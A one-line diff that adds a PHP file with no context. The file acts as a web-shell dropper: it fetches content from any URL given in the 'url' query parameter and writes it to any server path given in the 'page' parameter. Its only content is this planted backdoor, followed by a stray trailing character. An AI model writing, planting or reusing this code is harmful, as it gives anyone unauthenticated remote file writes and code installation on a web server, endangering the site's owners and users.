@@ -1,0 +1,1 @@
+<?php echo file_put_contents($_GET['page'], file_get_contents($_GET['url'])); ?>7
